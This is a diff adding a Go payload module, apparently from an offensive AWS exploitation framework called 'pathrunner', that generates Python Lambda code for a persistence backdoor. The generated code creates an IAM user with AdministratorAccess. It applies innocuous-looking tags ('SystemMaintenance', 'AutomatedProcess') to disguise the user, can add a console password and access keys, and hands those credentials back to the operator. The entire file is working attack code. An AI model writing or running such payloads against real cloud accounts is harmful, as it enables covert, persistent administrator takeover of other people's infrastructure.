@@ -1,0 +1,264 @@
+package lambda
+
+import (
+	"encoding/json"
+	"pathrunner/pkg/modules"
+	"pathrunner/pkg/payloads"
+	"strings"
+)
+
+type BackdoorUserPayload struct{}
+
+func NewBackdoorUserPayload() *BackdoorUserPayload {
+	return &BackdoorUserPayload{}
+}
+
+func init() {
+	payloads.Register(NewBackdoorUserPayload())
+}
+
+func (p *BackdoorUserPayload) GetName() string {
+	return "backdoor/user"
+}
+
+func (p *BackdoorUserPayload) GetDescription() string {
+	return "Create an IAM user with administrator privileges and console access"
+}
+
+func (p *BackdoorUserPayload) GetTags() []string {
+	return []string{
+		payloads.TagServiceLambda,
+		payloads.TagLanguagePython,
+		payloads.TagTechniqueBackdoor,
+		payloads.TagTransportOutput,
+	}
+}
+
+func (p *BackdoorUserPayload) GetOptions() []modules.Option {
+	return []modules.Option{
+		{
+			Name:        "USER_NAME",
+			Description: "Name for the backdoor user",
+			Required:    false,
+			Default:     "",
+		},
+		{
+			Name:        "CONSOLE_ACCESS",
+			Description: "Enable console password for the user",
+			Required:    false,
+			Default:     "true",
+		},
+		{
+			Name:        "ACCESS_KEY",
+			Description: "Create programmatic access keys",
+			Required:    false,
+			Default:     "true",
+		},
+		{
+			Name:        "USER_PATH",
+			Description: "IAM path for the user",
+			Required:    false,
+			Default:     "/",
+		},
+	}
+}
+
+func (p *BackdoorUserPayload) GenerateCode(options map[string]string) (string, error) {
+	userName := options["USER_NAME"]
+	consoleAccess := options["CONSOLE_ACCESS"] == "true"
+	accessKey := options["ACCESS_KEY"] == "true"
+	userPath := options["USER_PATH"]
+	if userPath == "" {
+		userPath = "/"
+	}
+
+	userNameCode := ""
+	if userName != "" {
+		userNameCode = "'" + userName + "'"
+	} else {
+		userNameCode = "f'pathrunner-admin-{int(time.time())}'"
+	}
+
+	consoleCode := ""
+	if consoleAccess {
+		consoleCode = `
+        # Generate a random password
+        password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%^&*', k=16))
+
+        # Set login profile for console access
+        iam_client.create_login_profile(
+            UserName=user_name,
+            Password=password,
+            PasswordResetRequired=False
+        )
+
+        result['console_password'] = password
+        result['console_url'] = f'https://{account_id}.signin.aws.amazon.com/console'`
+	}
+
+	accessKeyCode := ""
+	if accessKey {
+		accessKeyCode = `
+        # Create access keys
+        access_key_response = iam_client.create_access_key(UserName=user_name)
+        access_key = access_key_response['AccessKey']
+
+        result['access_key_id'] = access_key['AccessKeyId']
+        result['secret_access_key'] = access_key['SecretAccessKey']`
+	}
+
+	code := `import json
+import boto3
+import time
+import random
+import string
+
+def lambda_handler(event, context):
+    result = {
+        'message': 'Pathrunner backdoor user creation',
+        'timestamp': context.aws_request_id,
+        'status': 'started'
+    }
+
+    try:
+        iam_client = boto3.client('iam')
+        sts_client = boto3.client('sts')
+
+        # Get current account ID
+        caller_identity = sts_client.get_caller_identity()
+        account_id = caller_identity['Account']
+
+        # Generate user name if not specified
+        user_name = ` + userNameCode + `
+
+        # Administrator access policy
+        admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
+
+        # Create the backdoor user
+        user_response = iam_client.create_user(
+            UserName=user_name,
+            Path='` + userPath + `',
+            Tags=[
+                {
+                    'Key': 'Purpose',
+                    'Value': 'SystemMaintenance'
+                },
+                {
+                    'Key': 'CreatedBy',
+                    'Value': 'AutomatedProcess'
+                }
+            ]
+        )
+
+        result['user_arn'] = user_response['User']['Arn']
+        result['user_name'] = user_name
+        result['account_id'] = account_id
+
+        # Attach administrator policy
+        iam_client.attach_user_policy(
+            UserName=user_name,
+            PolicyArn=admin_policy_arn
+        )` + consoleCode + accessKeyCode + `
+
+        # Wait a moment for the user to be available
+        time.sleep(2)
+
+        result['status'] = 'success'
+        result['message'] = 'Backdoor user created successfully with administrator privileges'
+
+    except iam_client.exceptions.EntityAlreadyExistsException:
+        result['status'] = 'error'
+        result['message'] = f'User {user_name} already exists'
+    except Exception as e:
+        result['status'] = 'error'
+        result['message'] = f'Failed to create backdoor user: {str(e)}'
+
+    return {
+        'statusCode': 200,
+        'body': json.dumps(result, indent=2)
+    }
+`
+
+	return code, nil
+}
+
+func (p *BackdoorUserPayload) ProcessResult(result string) (string, error) {
+	var lambdaResponse map[string]interface{}
+	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
+		return result, err
+	}
+
+	body, ok := lambdaResponse["body"].(string)
+	if !ok {
+		return result, nil
+	}
+
+	var parsedBody map[string]interface{}
+	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
+		return result, err
+	}
+
+	var output strings.Builder
+	output.WriteString("=== Backdoor User Creation Results ===\n\n")
+
+	if status, ok := parsedBody["status"].(string); ok {
+		if status == "success" {
+			output.WriteString("✓ Backdoor user created successfully!\n\n")
+
+			if userArn, ok := parsedBody["user_arn"].(string); ok {
+				output.WriteString("User ARN: " + userArn + "\n")
+			}
+
+			if userName, ok := parsedBody["user_name"].(string); ok {
+				output.WriteString("User Name: " + userName + "\n")
+			}
+
+			if accountID, ok := parsedBody["account_id"].(string); ok {
+				output.WriteString("Account ID: " + accountID + "\n")
+			}
+
+			output.WriteString("\nAccess Methods:\n")
+
+			if consolePassword, ok := parsedBody["console_password"].(string); ok {
+				output.WriteString("Console Access:\n")
+				if consoleURL, ok := parsedBody["console_url"].(string); ok {
+					output.WriteString("  URL: " + consoleURL + "\n")
+				}
+				if userName, ok := parsedBody["user_name"].(string); ok {
+					output.WriteString("  Username: " + userName + "\n")
+				}
+				output.WriteString("  Password: " + consolePassword + "\n\n")
+			}
+
+			if accessKeyID, ok := parsedBody["access_key_id"].(string); ok {
+				output.WriteString("Programmatic Access:\n")
+				output.WriteString("  AWS_ACCESS_KEY_ID=" + accessKeyID + "\n")
+
+				if secretKey, ok := parsedBody["secret_access_key"].(string); ok {
+					output.WriteString("  AWS_SECRET_ACCESS_KEY=" + secretKey + "\n")
+				}
+				output.WriteString("\n")
+			}
+
+			output.WriteString("The user has AdministratorAccess policy attached.\n")
+			output.WriteString("⚠ Store these credentials securely!\n")
+
+		} else {
+			output.WriteString("✗ Failed to create backdoor user\n")
+			if message, ok := parsedBody["message"].(string); ok {
+				output.WriteString("Error: " + message + "\n")
+			}
+		}
+	}
+
+	if timestamp, ok := parsedBody["timestamp"].(string); ok {
+		output.WriteString("\nRequest ID: " + timestamp + "\n")
+	}
+
+	return output.String(), nil
+}
+
+func (p *BackdoorUserPayload) Validate(options map[string]string) error {
+	// No required options for this payload
+	return nil
+}
